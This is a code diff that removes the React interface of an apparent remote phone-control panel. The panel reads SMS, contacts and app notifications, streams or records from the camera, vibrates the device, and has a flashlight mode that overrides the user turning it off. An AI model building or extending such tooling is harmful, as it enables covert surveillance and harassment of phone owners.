-                                                    {new Date(sms.date).toLocaleDateString()} {new Date(sms.date).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
-                                                </span>
-                                            </div>
-                                            <p className="text-sm text-white/70 line-clamp-2">{sms.body}</p>
-                                            <div className="flex gap-2 mt-2">
-                                                <span className={`text-xs px-2 py-0.5 rounded ${sms.type === 1 ? 'bg-blue-500/20 text-blue-400' : 'bg-green-500/20 text-green-400'}`}>
-                                                    {sms.type === 1 ? 'Received' : 'Sent'}
-                                                </span>
-                                            </div>
-                                        </div>
-                                    ))}
-                                </div>
-                            ) : (
-                                <div className="p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40">
-                                    <svg className="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
-                                    {!selectedDeviceId
-                                        ? "Select a device to view SMS"
-                                        : isFetchingSms
-                                            ? "Fetching SMS..."
-                                            : "Click \"Fetch All SMS\" to load messages"}
-                                </div>
-                            )}
-                        </div>
-                    )}
-
-                    {/* Contacts Tool */}
-                    {selectedTool === 'contacts' && (
-                        <div className="space-y-4">
-                            <div className="flex flex-col sm:flex-row gap-3 justify-between items-start sm:items-center">
-                                <div className="flex gap-2">
-                                    <button
-                                        onClick={fetchContacts}
-                                        disabled={!selectedDeviceId || isFetchingContacts}
-                                        className={`px-4 py-2 rounded-lg border transition-colors text-sm font-medium flex items-center gap-2 ${selectedDeviceId ? 'bg-white text-black hover:bg-gray-200' : 'bg-white/5 border-white/5 text-white/20 cursor-not-allowed'}`}
-                                    >
-                                        {isFetchingContacts ? (
-                                            <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
-                                        ) : (
-                                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
-                                        )}
-                                        Fetch Contacts
-                                    </button>
-                                    {contactsList.length > 0 && (
-                                        <button
-                                            onClick={downloadContactsAsVcf}
-                                            className="px-3 py-2 rounded-lg border border-green-500/30 bg-green-500/10 text-green-400 text-sm hover:bg-green-500/20 transition-colors flex items-center gap-1"
-                                        >
-                                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
-                                            vCard
-                                        </button>
-                                    )}
-                                </div>
-                                <div className="relative w-full sm:w-64">
-                                    <input
-                                        type="text"
-                                        placeholder="Search contacts..."
-                                        value={contactsSearchQuery}
-                                        onChange={(e) => setContactsSearchQuery(e.target.value)}
-                                        className="w-full px-4 py-2 pl-10 rounded-lg bg-white/5 border border-white/10 text-white placeholder-white/40 focus:outline-none focus:border-purple-500/50"
-                                    />
-                                    <svg className="w-4 h-4 text-white/40 absolute left-3 top-1/2 -translate-y-1/2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
-                                </div>
-                            </div>
-
-                            {contactsList.length > 0 ? (
-                                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 max-h-[60vh] overflow-y-auto">
-                                    <p className="text-xs text-white/40 col-span-full">{filteredContacts.length} contacts</p>
-                                    {filteredContacts.map((contact: any) => (
-                                        <div
-                                            key={contact.id}
-                                            className="p-4 rounded-xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all"
-                                        >
-                                            <div className="flex items-center gap-3 mb-2">
-                                                <div className="w-10 h-10 rounded-full bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center font-bold text-sm">
-                                                    {contact.name?.charAt(0)?.toUpperCase() || '?'}
-                                                </div>
-                                                <div className="flex-1 min-w-0">
-                                                    <p className="font-medium text-sm truncate">{contact.name}</p>
-                                                </div>
-                                            </div>
-                                            {contact.phones?.length > 0 && (
-                                                <div className="space-y-1">
-                                                    {contact.phones.slice(0, 2).map((phone: any, idx: number) => (
-                                                        <p key={idx} className="text-xs text-white/60 flex items-center gap-1">
-                                                            <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path></svg>
-                                                            {typeof phone === 'string' ? phone : phone?.number || 'Unknown'}
-                                                        </p>
-                                                    ))}
-                                                </div>
-                                            )}
-                                            {contact.emails?.length > 0 && (
-                                                <div className="mt-1">
-                                                    {contact.emails.slice(0, 1).map((email: any, idx: number) => (
-                                                        <p key={idx} className="text-xs text-white/60 flex items-center gap-1 truncate">
-                                                            <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
-                                                            {typeof email === 'string' ? email : email?.address || 'Unknown'}
-                                                        </p>
-                                                    ))}
-                                                </div>
-                                            )}
-                                        </div>
-                                    ))}
-                                </div>
-                            ) : (
-                                <div className="p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40">
-                                    <svg className="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
-                                    {!selectedDeviceId
-                                        ? "Select a device to view contacts"
-                                        : isFetchingContacts
-                                            ? "Fetching contacts..."
-                                            : "Click \"Fetch Contacts\" to load contacts"}
-                                </div>
-                            )}
-                        </div>
-                    )}
-
-                    {/* Torch Tool */}
-                    {selectedTool === 'torch' && (
-                        <div className="bg-white/5 border border-white/10 p-6 rounded-2xl max-w-xl mx-auto">
-                            <div className="flex items-center justify-between mb-8">
-                                <div>
-                                    <h3 className="text-xl font-bold mb-1">Flashlight Control</h3>
-                                    <p className="text-white/40 text-sm">Control device flashlight remotely</p>
-                                </div>
-                                <button
-                                    onClick={toggleTorch}
-                                    disabled={!selectedDeviceId}
-                                    className={`w-16 h-8 rounded-full transition-colors relative ${isTorchOn ? 'bg-yellow-500' : 'bg-white/20'}`}
-                                >
-                                    <div className={`w-6 h-6 bg-white rounded-full absolute top-1 transition-transform shadow-lg ${isTorchOn ? 'left-9' : 'left-1'}`} />
-                                </button>
-                            </div>
-
-                            <div className="space-y-4 pt-4 border-t border-white/10">
-                                <div className="flex items-center justify-between p-4 rounded-xl bg-black/20">
-                                    <div className="flex items-center gap-3">
-                                        <div className="p-2 rounded-lg bg-red-500/20 text-red-400">
-                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
-                                        </div>
-                                        <div>
-                                            <p className="font-medium text-sm">Aggressive Mode</p>
-                                            <p className="text-xs text-white/40">Forces flashlight ON if turned off by user</p>
-                                        </div>
-                                    </div>
-                                    <button
-                                        onClick={() => setTorchAggressive(!torchAggressive)}
-                                        className={`w-12 h-6 rounded-full transition-colors relative ${torchAggressive ? 'bg-red-500' : 'bg-white/20'}`}
-                                    >
-                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${torchAggressive ? 'left-7' : 'left-1'}`} />
-                                    </button>
-                                </div>
-
-                                {torchAggressive && (
-                                    <div className="p-4 rounded-xl bg-black/20 animate-fadeIn">
-                                        <label className="block text-xs font-medium text-white/60 mb-2">Duration (minutes)</label>
-                                        <div className="flex items-center gap-4">
-                                            <input
-                                                type="range"
-                                                min="1"
-                                                max="5"
-                                                step="1"
-                                                value={torchDuration / 60000}
-                                                onChange={(e) => setTorchDuration(parseInt(e.target.value) * 60000)}
-                                                className="flex-1 accent-yellow-500 h-2 bg-white/10 rounded-lg appearance-none cursor-pointer"
-                                            />
-                                            <span className="text-sm font-bold w-12 text-right">{torchDuration / 60000}m</span>
-                                        </div>
-                                    </div>
-                                )}
-                            </div>
-                        </div>
-                    )}
-
-                    {/* Vibration Tool */}
-                    {selectedTool === 'vibration' && (
-                        <div className="bg-white/5 border border-white/10 p-6 rounded-2xl max-w-xl mx-auto">
-                            <div className="flex items-center justify-between mb-8">
-                                <div>
-                                    <h3 className="text-xl font-bold mb-1">Vibration Control</h3>
-                                    <p className="text-white/40 text-sm">Vibrate device remotely</p>
-                                </div>
-                            </div>
-
-                            <div className="space-y-6">
-                                <div>
-                                    <label className="block text-xs font-medium text-white/60 mb-2">Duration (seconds)</label>
-                                    <div className="flex items-center gap-4">
-                                        <input
-                                            type="range"
-                                            min="0.5"
-                                            max="10"
-                                            step="0.5"
-                                            value={vibrationDuration / 1000}
-                                            onChange={(e) => setVibrationDuration(parseFloat(e.target.value) * 1000)}
-                                            className="flex-1 accent-orange-500 h-2 bg-white/10 rounded-lg appearance-none cursor-pointer"
-                                        />
-                                        <span className="text-sm font-bold w-12 text-right">{vibrationDuration / 1000}s</span>
-                                    </div>
-                                </div>
-
-                                <button
-                                    onClick={triggerVibration}
-                                    disabled={!selectedDeviceId}
-                                    className={`w-full py-4 rounded-xl font-bold text-lg transition-all flex items-center justify-center gap-2 ${selectedDeviceId ? 'bg-gradient-to-r from-orange-500 to-red-500 hover:scale-[1.02] shadow-lg shadow-orange-500/20' : 'bg-white/10 text-white/20 cursor-not-allowed'}`}
-                                >
-                                    <svg className="w-6 h-6 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
-                                    Vibrate Now
-                                </button>
-                            </div>
-                        </div>
-                    )}
-
-                    {/* Notification Monitoring Tool */}
-                    {selectedTool === 'notifications' && (
-                        <div className="space-y-4">
-                            {/* App Filter Bar */}
-                            <div className="space-y-3">
-                                <div className="flex items-center justify-between">
-                                    <span className="text-xs font-semibold uppercase tracking-wider text-white/30">Filter by App</span>
-                                    {notifications.filter(n => !selectedDeviceId || n.deviceId === selectedDeviceId).length > 0 && (
-                                        <span className="px-2 py-0.5 bg-cyan-500/15 text-cyan-400 text-[10px] font-bold rounded-full">
-                                            {notifications.filter(n => {
-                                                if (selectedDeviceId && n.deviceId !== selectedDeviceId) return false;
-                                                if (selectedNotifApp === 'all') return true;
-                                                const filter = notifAppFilters.find(f => f.key === selectedNotifApp);
-                                                return filter?.packages.some(p => n.packageName?.includes(p));
-                                            }).length} results
-                                        </span>
-                                    )}
-                                </div>
-                                <div className="flex gap-1.5 overflow-x-auto pb-1" style={{ scrollbarWidth: 'none' }}>
-                                    {notifAppFilters.map(app => (
-                                        <button
-                                            key={app.key}
-                                            onClick={() => setSelectedNotifApp(app.key)}
-                                            className={`flex items-center gap-2 px-3 py-2 rounded-full transition-all flex-shrink-0 ${selectedNotifApp === app.key
-                                                ? 'shadow-lg scale-[1.03]'
-                                                : 'bg-white/[0.04] hover:bg-white/[0.08] border border-white/[0.06]'
-                                                }`}
-                                            style={selectedNotifApp === app.key ? {
-                                                background: `linear-gradient(135deg, ${app.color}25, ${app.color}10)`,
-                                                border: `1px solid ${app.color}50`,
-                                                boxShadow: `0 0 20px ${app.color}15`
-                                            } : {}}
-                                        >
-                                            {app.key === 'all' ? (
-                                                <svg className="w-4 h-4" style={{ color: selectedNotifApp === app.key ? app.color : 'rgba(255,255,255,0.4)' }} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
-                                            ) : (
-                                                <img src={app.img} alt={app.label} className="w-4 h-4 rounded-[4px] object-contain" />
-                                            )}
-                                            <span className={`text-xs font-medium whitespace-nowrap ${selectedNotifApp === app.key ? 'text-white' : 'text-white/40'
-                                                }`}>{app.label}</span>
-                                        </button>
-                                    ))}
-                                </div>
-                            </div>
-
-                            {/* Search */}
-                            <div className="relative">
-                                <svg className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-white/30" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
-                                <input
-                                    type="text"
-                                    placeholder="Search by app or content..."
-                                    value={notificationSearch}
-                                    onChange={(e) => setNotificationSearch(e.target.value)}
-                                    className="w-full bg-white/5 border border-white/10 rounded-xl pl-10 pr-4 py-3 text-sm focus:outline-none focus:border-cyan-500/50 transition-colors"
-                                />
-                            </div>
-
-                            {/* Empty State */}
-                            {notifications.length === 0 && (
-                                <div className="text-center py-12">
-                                    <svg className="w-16 h-16 mx-auto mb-4 text-white/10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
-                                    <p className="text-white/40 font-medium">No notifications yet</p>
-                                    <p className="text-white/20 text-xs mt-1">Notifications will appear here automatically</p>
-                                </div>
-                            )}
-
-                            {/* Notification Cards */}
-                            <div className="space-y-2 max-h-[65vh] overflow-y-auto pr-1" style={{ scrollbarWidth: 'thin', scrollbarColor: 'rgba(255,255,255,0.1) transparent' }}>
-                                {notifications
-                                    .filter(n => {
-                                        // Per-device filter
-                                        if (selectedDeviceId && n.deviceId && n.deviceId !== selectedDeviceId) return false;
-                                        // App filter
-                                        if (selectedNotifApp !== 'all') {
-                                            const filter = notifAppFilters.find(f => f.key === selectedNotifApp);
-                                            if (filter && !filter.packages.some(p => n.packageName?.includes(p))) return false;
-                                        }
-                                        // Search filter
-                                        if (!notificationSearch) return true;
-                                        const q = notificationSearch.toLowerCase();
-                                        return (n.appName?.toLowerCase().includes(q) || n.title?.toLowerCase().includes(q) || n.text?.toLowerCase().includes(q));
-                                    })
-                                    .map((notif, idx) => {
-                                        const timeAgo = (() => {
-                                            const diff = Date.now() - (notif.receivedAt || notif.timestamp);
-                                            if (diff < 60000) return `${Math.floor(diff / 1000)}s ago`;
-                                            if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
-                                            if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
-                                            return new Date(notif.timestamp).toLocaleDateString();
-                                        })();
-
-                                        // Determine if this is a new notification (less than 30s old)
-                                        const isNew = (Date.now() - (notif.receivedAt || notif.timestamp)) < 30000;
-
-                                        // Map category to color
-                                        const categoryColors: Record<string, string> = {
-                                            msg: 'border-l-green-500',
-                                            email: 'border-l-blue-500',
-                                            call: 'border-l-yellow-500',
-                                            social: 'border-l-pink-500',
-                                            promo: 'border-l-orange-500',
-                                        };
-                                        const borderColor = categoryColors[notif.category] || 'border-l-cyan-500';
-
-                                        return (
-                                            <button
-                                                key={`${notif.id}-${idx}`}
-                                                onClick={() => setSelectedNotification(notif)}
-                                                className={`w-full text-left p-3 rounded-xl border border-white/10 hover:bg-white/10 transition-all border-l-4 ${borderColor} ${notif.dismissed ? 'opacity-40' : ''} ${isNew ? 'bg-cyan-500/10 ring-1 ring-cyan-500/30' : 'bg-white/5'}`}
-                                            >
-                                                <div className="flex items-start gap-3">
-                                                    {notif.icon ? (
-                                                        <img
-                                                            src={`data:image/png;base64,${notif.icon}`}
-                                                            alt={notif.appName}
-                                                            className="w-8 h-8 rounded-lg flex-shrink-0"
-                                                        />
-                                                    ) : (
-                                                        <div className="w-8 h-8 rounded-lg bg-cyan-500/20 flex items-center justify-center flex-shrink-0">
-                                                            <svg className="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
-                                                        </div>
-                                                    )}
-                                                    <div className="flex-1 min-w-0">
-                                                        <div className="flex items-center justify-between">
-                                                            <span className="text-xs font-medium text-cyan-400">{notif.appName}</span>
-                                                            <div className="flex items-center gap-1.5 flex-shrink-0">
-                                                                {isNew && <span className="w-1.5 h-1.5 bg-cyan-400 rounded-full animate-pulse" />}
-                                                                <span className="text-[10px] text-white/30">{timeAgo}</span>
-                                                            </div>
-                                                        </div>
-                                                        {notif.title && <p className={`text-sm truncate ${isNew ? 'font-bold text-white' : 'font-semibold text-white/90'}`}>{notif.title}</p>}
-                                                        {notif.text && <p className="text-xs text-white/50 line-clamp-2 mt-0.5">{notif.text}</p>}
-                                                    </div>
-                                                </div>
-                                            </button>
-                                        );
-                                    })
-                                }
-                            </div>
-                        </div>
-                    )}
-
-                    {/* Notification Detail Modal */}
-                    {selectedNotification && (
-                        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm animate-fadeIn">
-                            <div className="bg-[#1a1a1a] border border-white/20 p-6 rounded-2xl shadow-2xl max-w-lg w-full mx-4 animate-scaleIn">
-                                <div className="flex justify-between items-start mb-4">
-                                    <div className="flex items-center gap-3">
-                                        {selectedNotification.icon ? (
-                                            <img
-                                                src={`data:image/png;base64,${selectedNotification.icon}`}
-                                                alt={selectedNotification.appName}
-                                                className="w-10 h-10 rounded-xl"
-                                            />
-                                        ) : (
-                                            <div className="w-10 h-10 rounded-xl bg-cyan-500/20 flex items-center justify-center">
-                                                <svg className="w-5 h-5 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>
-                                            </div>
-                                        )}
-                                        <div>
-                                            <h3 className="text-lg font-bold">{selectedNotification.appName}</h3>
-                                            <p className="text-xs text-white/40">
-                                                {new Date(selectedNotification.timestamp).toLocaleString()}
-                                            </p>
-                                        </div>
-                                    </div>
-                                    <button
-                                        onClick={() => setSelectedNotification(null)}
-                                        className="p-2 hover:bg-white/10 rounded-lg transition-colors"
-                                    >
-                                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
-                                    </button>
-                                </div>
-                                {selectedNotification.title && (
-                                    <div className="mb-3">
-                                        <p className="text-sm font-semibold">{selectedNotification.title}</p>
-                                    </div>
-                                )}
-                                <div className="p-4 rounded-xl bg-white/5 border border-white/10 mb-4">
-                                    <p className="text-sm whitespace-pre-wrap">{selectedNotification.text || 'No content'}</p>
-                                    {selectedNotification.subText && (
-                                        <p className="text-xs text-white/40 mt-2">{selectedNotification.subText}</p>
-                                    )}
-                                </div>
-                                <div className="flex gap-2 flex-wrap">
-                                    <span className="text-xs px-3 py-1 rounded-full bg-cyan-500/20 text-cyan-400">
-                                        {selectedNotification.packageName}
-                                    </span>
-                                    {selectedNotification.category && selectedNotification.category !== 'unknown' && (
-                                        <span className="text-xs px-3 py-1 rounded-full bg-white/10 text-white/60">
-                                            {selectedNotification.category}
-                                        </span>
-                                    )}
-                                    {selectedNotification.isOngoing && (
-                                        <span className="text-xs px-3 py-1 rounded-full bg-yellow-500/20 text-yellow-400">Ongoing</span>
-                                    )}
-                                    {selectedNotification.dismissed && (
-                                        <span className="text-xs px-3 py-1 rounded-full bg-red-500/20 text-red-400">Dismissed</span>
-                                    )}
-                                </div>
-                            </div>
-                        </div>
-                    )}
-
-                    {/* Camera Tool - Compact UI */}
-                    {selectedTool === 'camera' && (
-                        <div className="space-y-4">
-                            {/* Live Feed Container */}
-                            <div className={`bg-gray-900 border border-white/10 rounded-xl overflow-hidden ${isFullscreen ? 'fixed inset-2 z-50 flex flex-col' : ''}`}>
-                                {/* Compact Header - Hidden in fullscreen */}
-                                {!isFullscreen && (
-                                    <div className="px-3 py-2 border-b border-white/10 flex items-center justify-between bg-black/40">
-                                        <div className="flex items-center gap-2">
-                                            <div className={`w-2 h-2 rounded-full ${isLiveStreaming ? 'bg-red-500 animate-pulse' : isRecording ? 'bg-orange-500 animate-pulse' : isVideoUploading ? 'bg-blue-500 animate-pulse' : 'bg-green-500/50'}`} />
-                                            <span className="text-xs text-white/60 font-mono">
-                                                {isLiveStreaming ? 'LIVE' : isRecording ? `REC ${recordingProgress.current}s` : isVideoUploading ? 'UPLOADING...' : selectedDeviceId ? selectedDeviceId.substring(0, 8) : 'NO DEVICE'}
-                                            </span>
-                                        </div>
-                                        <div className="flex items-center gap-2">
-                                            {/* Quality Selector */}
-                                            <select
-                                                value={streamQuality}
-                                                onChange={(e) => setStreamQuality(Number(e.target.value))}
-                                                className="bg-black/50 border border-white/20 rounded px-1.5 py-0.5 text-xs text-cyan-400 font-mono"
-                                                disabled={isLiveStreaming}
-                                            >
-                                                <option value={144}>144p</option>
-                                                <option value={240}>240p</option>
-                                                <option value={360}>360p</option>
-                                                <option value={480}>480p</option>
-                                                <option value={720}>720p</option>
-                                            </select>
-                                            {/* Fullscreen */}
-                                            <button
-                                                onClick={() => setIsFullscreen(true)}
-                                                className="p-1.5 rounded bg-white/10 text-white/60 hover:bg-white/20"
-                                            >
-                                                <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 8V4m0 0h4M4 4l5 5m11-1V4m0 0h-4m4 0l-5 5M4 16v4m0 0h4m-4 0l5-5m11 5l-5-5m5 5v-4m0 4h-4"></path></svg>
-                                            </button>
-                                        </div>
-                                    </div>
-                                )}
-
-                                {/* Main Viewport */}
-                                <div className={`relative bg-black flex items-center justify-center overflow-hidden ${isFullscreen ? 'flex-1' : 'aspect-video'}`}>
-                                    {/* Live Stream View */}
-                                    {isLiveStreaming && liveFrame ? (
-                                        <img src={`data:image/jpeg;base64,${liveFrame}`} className="w-full h-full object-contain" alt="Live" />
-                                    ) : isRecording ? (
-                                        /* Compact Recording Animation */
-                                        <div className="flex flex-col items-center gap-3">
-                                            <div className="relative w-16 h-16">
-                                                <div className="absolute inset-0 border-2 border-red-500/30 rounded-full"></div>
-                                                <div className="absolute inset-0 border-2 border-red-500 rounded-full border-t-transparent animate-spin"></div>
-                                                <div className="absolute inset-2 bg-red-500/20 rounded-full flex items-center justify-center">
-                                                    <span className="text-xl font-bold text-red-500">{recordingProgress.current}</span>
-                                                </div>
-                                            </div>
-                                            <div className="text-center">
-                                                <p className="text-red-400 text-sm font-mono">● REC</p>
-                                                <div className="w-32 mt-2 bg-white/10 rounded-full h-1.5 overflow-hidden">
-                                                    <div className="bg-red-500 h-full transition-all duration-1000" style={{ width: `${(recordingProgress.current / recordingProgress.total) * 100}%` }}></div>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    ) : isVideoUploading ? (
-                                        /* Upload Status */
-                                        <div className="flex flex-col items-center gap-3">
-                                            <div className="w-12 h-12 border-2 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
-                                            <p className="text-blue-400 text-sm font-mono">Uploading video...</p>
-                                        </div>
-                                    ) : (
-                                        /* Idle State with Animation */
-                                        <div className="text-center">
-                                            <div className="relative w-16 h-16 mx-auto mb-2">
-                                                <div className="absolute inset-0 border-2 border-cyan-500/30 rounded-full animate-ping"></div>
-                                                <div className="absolute inset-0 border-2 border-cyan-500/20 rounded-full flex items-center justify-center">
-                                                    <svg className="w-8 h-8 text-cyan-500/40" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
-                                                </div>
-                                            </div>
-                                            <p className="text-white/30 text-xs">Ready</p>
-                                        </div>
-                                    )}
-
-                                    {/* Camera Switch - Only show when NOT live streaming and not in fullscreen */}
-                                    {!isFullscreen && !isLiveStreaming && (
-                                        <button
-                                            onClick={() => setCameraMode(prev => prev === 'back' ? 'front' : 'back')}
-                                            className={`absolute top-2 left-2 flex items-center gap-1.5 px-2 py-1 rounded-lg text-xs font-bold ${cameraMode === 'front' ? 'bg-purple-500/80 text-white' : 'bg-cyan-500/80 text-white'}`}
-                                        >
-                                            <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
-                                            {cameraMode.toUpperCase()}
-                                        </button>
-                                    )}
-
-                                    {/* Fullscreen Close Button */}
-                                    {isFullscreen && (
-                                        <button
-                                            onClick={() => setIsFullscreen(false)}
-                                            className="absolute top-3 right-3 p-2 rounded-full bg-black/50 text-white hover:bg-black/70"
-                                        >
-                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
-                                        </button>
-                                    )}
-
-                                    {/* Error */}
-                                    {cameraError && (
-                                        <div className="absolute bottom-2 left-2 right-2 bg-red-500/90 text-white text-xs p-2 rounded">⚠️ {cameraError}</div>
-                                    )}
-                                </div>
-
-                                {/* Control Panel - Fullscreen shows only stop buttons */}
-                                <div className={`p-3 bg-black/60 ${isFullscreen ? 'flex justify-center' : ''}`}>
-                                    {isFullscreen ? (
-                                        /* Fullscreen: Only show stop button for active operation */
-                                        <div className="flex gap-3">
-                                            {isLiveStreaming && (
-                                                <button
-                                                    onClick={() => {
-                                                        socket?.emit('stop_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
-                                                        setIsLiveStreaming(false);
-                                                        setLiveFrame(null);
-                                                        setIsFullscreen(false);
-                                                    }}
-                                                    className="px-6 py-2 rounded-lg bg-red-600 text-white font-bold flex items-center gap-2"
-                                                >
-                                                    ⏹ Stop Live
-                                                </button>
-                                            )}
-                                            {isRecording && (
-                                                <button
-                                                    onClick={() => {
-                                                        socket?.emit('stop_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
-                                                        setIsRecording(false);
-                                                        setIsVideoUploading(true);
-                                                        setIsFullscreen(false);
-                                                    }}
-                                                    className="px-6 py-2 rounded-lg bg-red-600 text-white font-bold flex items-center gap-2"
-                                                >
-                                                    ⏹ Stop Recording
-                                                </button>
-                                            )}
-                                            {!isLiveStreaming && !isRecording && (
-                                                <button
-                                                    onClick={() => setIsFullscreen(false)}
-                                                    className="px-6 py-2 rounded-lg bg-white/20 text-white font-bold"
-                                                >
-                                                    Exit Fullscreen
-                                                </button>
-                                            )}
-                                        </div>
-                                    ) : (
-                                        /* Normal Mode: All controls */
-                                        <div className="flex gap-2">
-                                            {/* GO LIVE */}
-                                            <button
-                                                onClick={() => {
-                                                    if (!selectedDeviceId) return;
-                                                    if (isLiveStreaming) {
-                                                        socket?.emit('stop_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
-                                                        setIsLiveStreaming(false);
-                                                        setLiveFrame(null);
-                                                    } else {
-                                                        socket?.emit('start_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, quality: streamQuality });
-                                                        setIsLiveStreaming(true);
-                                                    }
-                                                }}
